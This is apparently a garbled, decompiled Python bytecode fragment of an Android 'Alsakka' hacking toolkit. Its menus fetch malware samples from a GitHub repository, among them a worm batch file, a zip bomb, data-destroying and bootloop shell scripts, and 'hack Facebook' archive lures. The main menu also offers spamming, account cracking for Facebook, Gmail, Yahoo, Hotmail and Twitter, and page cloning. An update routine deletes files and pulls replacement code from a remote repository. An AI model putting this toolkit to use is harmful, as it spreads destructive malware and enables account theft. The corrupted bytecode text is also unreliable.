/sdcard/Alsakka/virus/RansomewareFileDecryptor.exer�   zHhttps://github.com/Ractomes/Viruses/blob/master/samples/RIP.bat?raw=truez3mv 'RIP.bat?raw=true' /sdcard/Alsakka/virus/RIP.batr�   z[1;31m[!] ERROR r   rA  rG  )Zmenu3ro   r0   r#   r�   r�   r3   r'   )r>  �vpcwinr   r   rI  �  s   































zvirus.<locals>.vpcwinc               	      s�  t �d� t�  t�  td� td� td� �z�td�} | dkr�d}d}tj|d	d
�}t|j	d �}|�
d�d }t|d��0}t|j|d�|| dd�D ]}|�|� q�W 5 Q R X t �d� tt� td� t�  n�| dk�rvd}d}tj|d	d
�}t|j	d �}|�
d�d }t|d��2}t|j|d�|| dd�D ]}|�|� �q8W 5 Q R X t �d� tt� td� t�  n:| dk�s�| dk�r���  t�  ntd� t�d� � �  W n. tk
�r�   td� t�d� t�  Y nX d S )Nr"   z*[1;35m[1] How to hack facebook (ext: rar)z#[2] Hack facebook        (ext: rar)�
[0] Back

z [1;34mEnter Number >> :[1;32m r_   rg   zPhttps://github.com/Ractomes/Viruses/blob/master/samples/howtohackfb.rar?raw=trueTrh   rj   rk   rl   rm   rn   rp   rq   zLmv 'howtohackfb.rar?raw=true' /sdcard/Alsakka/virus/How-to-hack-facebook.rarzpassword: cracker
ra   zQhttps://github.com/Ractomes/Viruses/blob/master/samples/hackfacebook.rar?raw=truezFmv 'hackfacebook.rar?raw=true' /sdcard/Alsakka/virus/Hack-facebook.rarrs   rt   �[1;31m[!] EROORr   rA  )r)   r*   r   r!   r   r+   r(   r.   rW   rx   ry   r,   r   rz   rV   rB  rC  ru   rv   �	NameErrorr{   )Zmenu4ro   r0   r#   r�   r�   r3   r'   )�Vpdfautorunpcr>  r   r   rM  	  sX    






zvirus.<locals>.Vpdfautorunpcc               	      s�  t �d� t�  t�  td� td� td� �zrtd�} | dkr�d}d}tj|d	d
�}t|j	d �}|�
d�d }t|d��0}t|j|d�|| dd�D ]}|�|� q�W 5 Q R X t �d� tt� t�  n�| dk�rfd}d}tj|d	d
�}t|j	d �}|�
d�d }t|d��2}t|j|d�|| dd�D ]}|�|� �q0W 5 Q R X t �d� tt� t�  n:| dk�sz| dk�r���  t�  ntd� t�d� � �  W n. tk
�r�   td� t�d� t�  Y nX d S )Nr"   z[1;33m[1] Worm.batz[2] Bomb.ziprJ  � [1;31mEnter number >> :[1;32m r_   rg   zIhttps://github.com/Ractomes/Viruses/blob/master/samples/worm.bat?raw=trueTrh   rj   rk   rl   rm   rn   rp   rq   z5mv 'worm.bat?raw=true' /sdcard/Alsakka/virus/worm.batra   zLhttps://github.com/Ractomes/Viruses/blob/master/samples/bom-zip.zip?raw=truez8mv 'bom-zip.zip?raw=true' /sdcard/Alsakka/virus/Bomb.ziprs   rt   rK  r   rA  rG  )Zmenu5ro   r0   r#   r�   r�   r3   r'   )�Votherr>  r   r   rO  J	  sT    






zvirus.<locals>.Votherc               	      s�  t �d� t�  t�  td� td� td� �zhtd�} | dkr�d}d}tj|d	d
�}t|j	d �}|�
d�d }t|d��0}t|j|d�|| dd�D ]}|�|� q�W 5 Q R X t �d� tt� t�  n�| dk�rfd}d}tj|d	d
�}t|j	d �}|�
d�d }t|d��2}t|j|d�|| dd�D ]}|�|� �q0W 5 Q R X t �d� tt� t�  n0| dk�r~��  t�  ntd� t�d� � �  W n. tk
�r�   td� t�d� t�  Y nX d S )Nr"   z[1;35m[1] Data-Eater.shz[2] Bootloop.shrJ  z [1;32mEnter number >> :[1;31m r_   rg   zNhttps://github.com/Ractomes/Viruses/blob/master/samples/data-eater.sh?raw=trueTrh   rj   rk   rl   rm   rn   rp   rq   z?mv 'data-eater.sh?raw=true' /sdcard/Alsakka/virus/Data-Eater.shra   zLhttps://github.com/Ractomes/Viruses/blob/master/samples/bootloop.sh?raw=truez;mv 'bootloop.sh?raw=true' /sdcard/Alsakka/virus/Bootloop.shrs   rK  r   rA  rG  )Zmenu6ro   r0   r#   r�   r�   r3   r'   )�
Shellvirusr>  r   r   rP  v	  sT    







zvirus.<locals>.Shellvirusc                     s�   t d� z�td�} | dks"| dkr*��  n�| dks:| dkrB��  n�| dksR| dkrZ��  nx| d	ksj| d	krr��  n`| d
ks�| d
kr���  nH| dks�| dkr�� �  n0| dks�| dkr�t�  nt d� t�d� t�  W n  tk
r�   t d� t Y nX d S )Naf  [1;35m
[1;36m[[1;31m01[1;36m][1;35m Android          [1;36m  [[1;31m02[1;36m][1;35m Macosx
[1;36m[[1;31m03[1;36m][1;35m Windows          [1;36m[1;31m  [1;36m[[1;31m04[1;36m][1;35m Pdf Autorun
[1;36m[[1;31m05[1;36m][1;35m Other            [1;36m[1;36m  [[1;31m06[1;36m][1;35m Shell
[1;36m[[1;31m00[1;36m][1;35m Back

          r?  r_   r`   ra   rb   rc   rd   re   r�   r�   r�   rs   rt   �&[1;32m[[1;31m![1;32m] [1;31mERROORr   z.[1;32m[[1;31m![1;32m][1;36m NO ientrnet !!)r   r+   r{   ru   rv   rC  rE  ��menu)rP  rF  rH  rO  rM  rI  r   r   rS  �	  s.    

zvirus.<locals>.menu�__main__r"   )r�   r)   r*   r�   r1   rR  r   )rP  rF  rH  rO  rM  r>  rI  r   rC    s$        g+ .,,
rC  c               	   C   s�   t �  t�d� t�d� t�d� t�d� t�d� d} d}tj|dd	�}t|jd
 �}|�d�d }t|d��0}t	|j
| d�||  dd�D ]}|�|� q�W 5 Q R X t�d� d S )Nzrm -rif /sdcard/Alsakka/zmkdir /sdcard/Alsakka/zmkdir /sdcard/Alsakka/payload/zmkdir /sdcard/Alsakka/viruszrm -rif tools.pyrg   zFhttps://github.com/ABDULLAHALSAKKA/ngrok/blob/master/tools.py?raw=trueTrh   rj   rk   rl   rm   rn   rp   rq   zmv 'tools.py?raw=true' tools.py)r   r)   r*   r(   r.   rW   rx   ry   r,   r   rz   rV   )ro   r0   r#   r�   r�   r3   r'   r   r   r   �updaete�	  s    




rU  c               	   C   s�  t �d� t�  t�  td� td�} | dkr�i }t�|��R}|�td�g� t �d� t �d� td� td�}t �d	| d
 � t�  W 5 Q R X �n | dk�rddddd�gd�}t�|��H}|�td�g� t �d� td� td�}t �d	| d
 � t�  W 5 Q R X n�| dk�s$| dk�r,t	�  nl| dk�r�td�}t �d| � t �d� td� td�}t �d	| d
 � t�  ntd� t
�d� t�  d S )Nr"   z�[0m
[1;33m[[1;31m01[1;33m][1;35m Video Download
[1;33m[[1;31m02[1;33m][1;35m Audio Download
[1;33m[[1;31m03[1;33m][1;35m Audio PlayList Download
[1;33m[[1;31m00[1;33m][1;35m Back


    z#[1;31mEnter Snap tube >> :[1;32m r_   z[1;34mURL Video >> : [1;32mZlsz


z$[1;31mEnter neme video >> :[1;32m zmv z /sdcard/Alsakka/youtube/ra   zbestaudio/bestZFFmpegExtractAudioZmp3Z192)�keyZpreferredcodecZpreferredquality)rM   Zpostprocessorsz[1;34mURL Audio >> : [1;32mzclear && lsz"[1;31mEnter neme mp3 >> : [1;32mrs   rt   rc   z[1;31mplaylist URL: [1;32mz3youtube-dl -cit --extract-audio --audio-format mp3 z$[1;34mEnter neme audio >> :[1;32m rQ  r   )r)   r*   r   r!   r   r+   �
youtube_dlZ	YoutubeDL�downloadr{   ru   rv   )ZchoiceZydl_optsZydlr}   Zd3r   r   r   rX  �	  sT    



��



rX  c                  C   s�  dd� } t �d� | d� td�}|dks2|dkr8t�  |dksH|d	krNt�  |d
ks^|dkrdt�  |dkst|dkrzt�  |dks�|dkr�t�  |dks�|dkr�t�  |dks�|dkr�t	�  |dks�|dkr�t
�  |dks�|dkr�t�  |dkr�t�  |dk�rt�  |dk�rt�  |dk�r&t�  |dk�r6t�  |dk�rFt�  |dk�rVt�  |dk�rft�  |d k�rvt�  |d!k�r�t�  |d"k�r�t�  |d#k�s�|d$k�r�td%� t�d&� t�  ntd'� t�d&� t�  d S )(Nc                 S   s2   | d D ]$}t j�|� t j��  t�d� qd S )NrQ   g-C��6?r7  r:  r   r   r   �slowprin
  s    
zmyprint.<locals>.slowprinr"   u�  
[1;31m _______   _          _______   _______   _         _         _______
[1;32m(  ___  ) ( \        (  ____ \ (  ___  ) | \    /\ | \    /\ (  ___  )
[1;33m| (   ) | | (        | (    \/ | (   ) | |  \  / / |  \  / / | (   ) |
[1;36m| (___) | | |        | (_____  | (___) | |  (_/ /  |  (_/ /  | (___) |
[1;35m|  ___  | | |        (_____  ) |  ___  | |   _ (   |   _ (   |  ___  |
[1;30m| (   ) | | |              ) | | (   ) | |  ( \ \  |  ( \ \  | (   ) |
[1;36m| )   ( | | (____/\  /\____) | | )   ( | |  /  \ \ |  /  \ \ | )   ( |
[1;31m|/     \| (_______/  \_______) |/     \| |_/    \/ |_/    \/ |/     \|

                      [1;31m$[1;34m <=> [1;31m$[1;32m 1.2.0 [1;31m$[1;34m <=>[1;31m $$[1;30m
[1;34m╔--------------------------------------------------------------------╗
[1;34m|                                                                    [1;34m|
[1;34m|  [1;30m[[1;31m01[1;30m][1;36m - Metasploit      [1;30m[[1;31m02[1;30m][1;36m - Sqlmap        [1;30m[[1;31m03[1;30m][1;36m - Virus          [1;34m|
[1;34m|  [1;30m[[1;31m04[1;30m][1;36m - Ngrok           [1;30m[[1;31m05[1;30m][1;36m - Nmap          [1;30m[[1;31m06[1;30m][1;36m - Spammer        [1;34m|
[1;34m|  [1;30m[[1;31m07[1;30m][1;36m - Open-port      [1;30m [[1;31m08[1;30m][1;36m - cp-panel      [1;30m[[1;31m09[1;30m][1;36m - Hash           [1;34m|
[1;34m|  [1;30m[[1;31m10[1;30m][1;36m - Facebook       [1;30m [[1;31m11[1;30m][1;36m - Gmail         [1;30m[[1;31m12[1;30m][1;36m - Yahoo          [1;34m|
[1;34m|  [1;30m[[1;31m13[1;30m][1;36m - Hotmail        [1;30m [[1;31m14[1;30m][1;36m - Twitter       [1;30m[[1;31m15[1;30m][1;36m - Woordlist      [1;34m|
[1;34m|  [1;30m[[1;31m16[1;30m][1;36m - fb-clong       [1;30m [[1;31m17[1;30m][1;36m - image         [1;30m[[1;31m18[1;30m][1;36m - Youtube      [1;34m  |
[1;34m|  [1;30m[[1;31m19[1;30m][1;36m - updaete        [1;30m [[1;31m20[1;30m][1;36m - info          [1;30m[[1;31m00[1;30m][1;36m - Exit      [1;34m     |
[1;34m|                                                                    [1;34m|
[1;34m╚--------------------------------------------------------------------╝



    rN  r_   r`   ra   rb   rc   rd   re   rf   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   r�   rs   rt   z

[1;34mby by !!
r   z([1;31m[[1;32m-[1;31m][1;34m ERROR !!)r)   r*   r+   r�   r�   rC  r|   r�   r�   r�   r6  r�   r6   rC   rD   rA   rP   r]   r�   r�   rX  rU  r=  r   ru   rv   r1   r{   )rY  r<  r   r   r   r{   
  sf    












r{   )6r)   ru   r�   �rer�   r   r:   Zsslr�   r�   r4  r�   �platformr�   r�   Zbs4r   r   r(   rH   rW  Zfbchat.models�ImportErrorr*   r�   rB  rw   r~   r   r�   r�   r   r!   r6   rA   rC   rD   rP   r]   r|   r�   r�   r�   r�   r�   r�   r�   r�   r6  r=  rC  rU  rX  r{   r   r   r   r   �<module>   s�   




&   &/*<6E
W           F5R